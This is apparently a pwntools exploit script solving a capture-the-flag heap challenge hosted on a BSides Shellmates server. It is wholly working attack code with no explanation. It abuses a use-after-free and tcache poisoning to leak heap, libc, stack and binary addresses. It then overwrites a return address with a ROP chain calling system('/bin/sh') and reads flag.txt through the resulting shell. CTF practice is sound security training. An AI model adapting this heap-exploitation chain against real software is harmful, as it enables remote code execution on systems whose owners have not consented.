from pwn import *
context.binary=exe=ELF("./chall_patched",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
#p=process(exe.path)
p=remote("just-pwnme.bsides.shellmates.club", 443,ssl=True)
def add(index,size,data):
	p.sendlineafter(b"[*] choice : ",b"0")
	p.sendlineafter(b"[*] Index : ",f"{index}".encode())
	p.sendlineafter(b"[*] Size : ",f"{size}".encode())
	p.sendafter(b"[*] Data : ",data)
def free(index):
	p.sendlineafter(b"[*] choice : ",b"1")
	p.sendlineafter(b"[*] Index : ",f"{index}".encode())
def view(index):
	p.sendlineafter(b"[*] choice : ",b"2")
	p.sendlineafter(b"[*] Index : ",f"{index}".encode())
def edit(index,data):
	p.sendlineafter(b"[*] choice : ",b"3")
	p.sendlineafter(b"[*] Index : ",f"{index}".encode())
	p.sendafter(b"[*] Data : ",data)

payload=flat(
	0,0,
	0,0x501,
	)
add(0,0xf8,payload)

payload=flat(
	0,0x101,
	0,0x101,
	0,0x101
	)
for i in range(5):
	add(0,0xf8,payload)
add(1,0xf8,b"B"*0xf8)
payload=b"A"*0xf0+p64(0x4d0)
free(0)
view(0)
leak=int.from_bytes(p.recvuntil(b" Allocate",drop=True).split(b"\n")[0],"little")
log.info('[+]leak:'+hex(leak))
heap=leak<<12
log.info('[+]heap base:'+hex(heap))
free(1)


##########stage2: leak libc###########################

payload=p64((heap+0x8a0)>>12^(heap+0x2c0))
edit(1,payload)

add(0,248,b"A"*248)
add(0,248,b"A"*248)
free(0)

view(0)
leak=int.from_bytes(p.recvuntil(b" Allocate",drop=True).split(b"\n")[0],"little")
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x219ce0
log.info('[+]libc base:'+hex(libc.address))
##############################################################


#############stage 3###################################

add(0,0x20,b"A"*0x20)
add(1,0x20,b"A"*0x20)
free(0)
free(1)
payload=p64((heap+0x2f0)>>12^(libc.sym['environ']-0x10))
edit(1,payload)
add(0,0x20,b"A")
add(1,0x20,b"A"*0x10)
view(1)
p.recvuntil(b"A"*0x10)
stack=int.from_bytes(p.recv(6),"little")
log.info("[+]stack leak:"+hex(stack))
menu_rip=stack-0x170
main_rip=stack-0x120# main#rip-8
log.info("[+]menu:"+hex(menu_rip))
log.info("[+]main:"+hex(main_rip))
############ stage4:########################################
add(0,0x50,b"A"*0x20)
add(1,0x50,b"A"*0x20)
free(0)
free(1)

payload=p64((heap+0x380)>>12^(main_rip-8))
edit(1,payload)

add(0,0x50,b"A"*0x20)
pop_rdi=libc.address+0x000000000002a3e5
ret=libc.address+0x0000000000029cd6
payload=flat(
	0,
	pop_rdi,next(libc.search(b"/bin/sh")),
	libc.sym['system']
	)
#payload=p64(0)+p64(libc.address+0xebcf5)
add(1,0x50,b"A"*0x18)
view(1)
p.recvuntil(b"A"*0x18)
leak=int.from_bytes(p.recv(6),"little")
log.info('[+]exe leak:'+hex(leak))
exe.address=leak-0x13a2
rw_section=exe.address+0x5a00
payload=flat(rw_section,pop_rdi,next(libc.search(b"/bin/sh")),ret,libc.sym['system']+5)
edit(1,payload)


##########get shell#######################
p.sendlineafter(b"[*] choice : ",b"4")
p.sendline(b"cat flag.txt")
p.interactive()